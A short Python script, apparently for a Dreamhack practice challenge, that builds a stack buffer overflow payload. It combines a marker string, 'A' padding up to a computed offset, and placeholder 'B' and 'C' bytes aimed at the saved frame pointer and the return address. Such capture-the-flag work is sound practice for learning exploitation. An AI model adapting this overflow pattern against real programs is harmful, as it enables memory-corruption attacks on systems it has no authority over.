buf2ret = 0x80+0x8

in_str = "DREAMHACK!ZYXWV"

payload = in_str
payload += "A"*(buf2ret - len(in_str)- 8)
payload += "B"*8
payload += "C"*8

print(payload)